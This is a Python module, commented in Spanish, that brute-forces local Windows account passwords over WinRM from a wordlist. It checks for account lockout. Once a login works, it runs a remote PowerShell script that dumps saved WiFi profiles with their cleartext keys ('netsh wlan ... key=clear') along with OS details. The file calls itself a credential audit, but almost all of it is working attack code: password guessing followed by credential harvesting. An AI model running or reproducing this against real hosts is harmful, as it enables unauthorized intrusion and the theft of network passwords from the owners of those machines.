"""Prueba de credenciales via WinRM y, si funcionan, extraccion del SO exacto
y perfiles WiFi guardados en el equipo remoto. Usa cuentas LOCALES
('IP\\usuario'), igual criterio que smb_cred.py.

Version multiplataforma: en vez de invocar 'powershell.exe' local (que solo
existe en Windows) para lanzar Invoke-Command, se conecta al servicio WinRM
del equipo remoto con la libreria pura-Python 'pywinrm' (WSMan/HTTP sobre
5985). Asi la auditoria de credenciales corre igual desde Windows, macOS o
Linux. Los scripts PowerShell se ejecutan EN EL EQUIPO REMOTO, no aca.

Nota de comportamiento: la version anterior obtenia el SO 'osonly' via
WMI/CIM sobre DCOM (puerto 135), que a veces funciona con WinRM apagado.
Aqui 'osonly' corre Get-CimInstance DENTRO de la sesion WinRM remota; si
WinRM esta apagado no habra dato de SO por esta via (el resto del flujo no
depende de eso).
"""
from __future__ import annotations

import json
import socket
import time
from typing import Optional, Tuple

import winrm
from winrm.exceptions import (
    InvalidCredentialsError,
    WinRMError,
    WinRMOperationTimeoutError,
    WinRMTransportError,
)

# Scripts PowerShell que corren EN EL EQUIPO REMOTO dentro de la sesion WinRM.
_PS_TEST = "$env:COMPUTERNAME"

_PS_OSONLY = r"""
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
$cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
[PSCustomObject]@{
    Hostname  = $cs.Name
    OSCaption = $os.Caption
    OSVersion = $os.Version
} | ConvertTo-Json -Compress
"""

_PS_HARVEST = r"""
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$profiles = @()
try {
    $rawList = netsh wlan show profiles
    $names = @()
    foreach ($line in $rawList) {
        if ($line -match ":\s*(.+)\s*$" -and ($line -match "All User Profile" -or $line -match "Perfil de todos los usuarios")) {
            $names += $Matches[1].Trim()
        }
    }
    foreach ($n in $names) {
        $detail = netsh wlan show profile name="$n" key=clear
        $pass = $null
        foreach ($line in $detail) {
            if ($line -match "^\s*(Key Content|Contenido de la clave)\s*:\s*(.+)\s*$") {
                $pass = $Matches[2].Trim()
                break
            }
        }
        $profiles += [PSCustomObject]@{ SSID = $n; Password = $pass }
    }
}
catch { }
[PSCustomObject]@{
    Hostname     = $env:COMPUTERNAME
    OSCaption    = $os.Caption
    OSVersion    = $os.Version
    WifiProfiles = $profiles
} | ConvertTo-Json -Depth 4 -Compress
"""

_ACTION_SCRIPTS = {"test": _PS_TEST, "osonly": _PS_OSONLY, "harvest": _PS_HARVEST}


def _winrm_port_open(ip: str, timeout_s: float = 1.5) -> bool:
    """WinRM escucha en 5985 (HTTP) / 5986 (HTTPS). Un probe TCP corto evita
    intentar una sesion WinRM completa por cada palabra de la wordlist cuando
    el puerto esta cerrado (caso comun: 445 abierto, 5985 cerrado)."""
    for port in (5985, 5986):
        try:
            with socket.create_connection((ip, port), timeout=timeout_s):
                return True
        except Exception:
            continue
    return False


def _run_helper(ip: str, username: str, password: str, action: str, timeout_s: float) -> Tuple[bool, str]:
    """Ejecuta el script de `action` en el equipo remoto via WinRM.

    Devuelve (ok_transporte, salida). 'ok_transporte' es False solo cuando no
    se pudo ni hablar con WinRM (puerto cerrado/timeout/host caido). Un fallo
    de credenciales devuelve (True, 'RESULT:FAIL:...') para que el llamador lo
    distinga de un problema de conectividad, igual que la version anterior."""
    script = _ACTION_SCRIPTS.get(action, _PS_TEST)
    op_timeout = int(max(1, timeout_s))
    try:
        session = winrm.Session(
            f"http://{ip}:5985/wsman",
            auth=(f"{ip}\\{username}", password),
            transport="ntlm",
            operation_timeout_sec=op_timeout,
            read_timeout_sec=op_timeout + 5,
        )
        result = session.run_ps(script)
    except InvalidCredentialsError as exc:
        # 401: credenciales rechazadas. Es un fallo de autenticacion, NO de
        # conectividad -> ok_transporte True con RESULT:FAIL.
        return True, f"RESULT:FAIL:access is denied ({exc})"
    except (WinRMOperationTimeoutError, socket.timeout, TimeoutError):
        return False, "timeout"
    except (WinRMTransportError, WinRMError, ConnectionError, OSError) as exc:
        # No se pudo establecer la sesion WSMan (WinRM apagado, firewall, host
        # caido): el llamador lo tratara como 'unreachable'.
        return False, f"winrm cannot connect: {exc}"
    except Exception as exc:  # respaldo (p.ej. requests.ConnectionError)
        return False, f"winrm cannot connect: {exc}"

    stdout = (result.std_out or b"").decode("utf-8", errors="replace")
    stderr = (result.std_err or b"").decode("utf-8", errors="replace")
    if result.status_code == 0:
        return True, "RESULT:SUCCESS\n" + stdout
    return True, "RESULT:FAIL:" + (stderr.strip() or stdout.strip() or "error desconocido")


def try_winrm_login(ip: str, username: str, password: str, timeout_s: float = 12.0) -> str:
    """Devuelve 'success' | 'fail' | 'locked' | 'unreachable'."""
    ok, output = _run_helper(ip, username, password, "test", timeout_s)
    if not ok:
        return "unreachable"
    if "RESULT:SUCCESS" in output:
        return "success"
    lowered = output.lower()
    ## Un fallo de conexion WinRM (WSMan) NO es "password incorrecta" -> es
    ## 'unreachable', para cortar en el primer intento en vez de martillar
    ## toda la wordlist.
    if any(s in lowered for s in ("wsman", "cannot connect", "no se puede", "winrm cannot", "connecting to remote server")):
        return "unreachable"
    ## Bloqueo de cuenta (best-effort: WinRM/Negotiate suele reportarlo como
    ## 'access is denied' generico, pero cuando el texto lo dice, se detecta).
    if any(s in lowered for s in ("locked out", "1909", "bloqueada", "cuenta esta bloqueada")):
        return "locked"
    return "fail"


def harvest_via_winrm(ip: str, username: str, password: str, timeout_s: float = 15.0) -> Optional[dict]:
    """Solo llamar con credenciales ya confirmadas. Devuelve un dict con
    hostname/OSCaption/OSVersion/WifiProfiles, o None si fallo."""
    ok, output = _run_helper(ip, username, password, "harvest", timeout_s)
    if not ok or "RESULT:SUCCESS" not in output:
        return None
    lines = output.splitlines()
    json_lines = [l for l in lines if l.strip() and not l.startswith("RESULT:")]
    if not json_lines:
        return None
    try:
        return json.loads("\n".join(json_lines))
    except Exception:
        return None


def get_os_via_cim(ip: str, username: str, password: str, timeout_s: float = 12.0) -> Optional[dict]:
    """Obtiene hostname/SO exacto via Get-CimInstance ejecutado en la sesion
    WinRM remota. Solo llamar con credenciales ya confirmadas."""
    ok, output = _run_helper(ip, username, password, "osonly", timeout_s)
    if not ok or "RESULT:SUCCESS" not in output:
        return None
    lines = [l for l in output.splitlines() if l.strip() and not l.startswith("RESULT:")]
    if not lines:
        return None
    try:
        return json.loads("\n".join(lines))
    except Exception:
        return None


def crack_winrm_account(ip: str, username: str, wordlist, delay_s: float = 2.0, max_attempts: Optional[int] = None):
    ## Corto-circuito: si ni 5985 ni 5986 estan abiertos, no tiene sentido
    ## lanzar N sesiones WinRM -> unreachable ya.
    if not _winrm_port_open(ip):
        return "unreachable", None, 0

    attempts = 0
    limit = max_attempts or len(wordlist)
    for password in wordlist[:limit]:
        attempts += 1
        outcome = try_winrm_login(ip, username, password)
        if outcome == "success":
            return "cracked", password, attempts
        if outcome == "locked":
            return "locked", None, attempts  # deja de martillar una cuenta ya bloqueada
        if outcome == "unreachable":
            return "unreachable", None, attempts
        time.sleep(delay_s)
    return "not_found", None, attempts
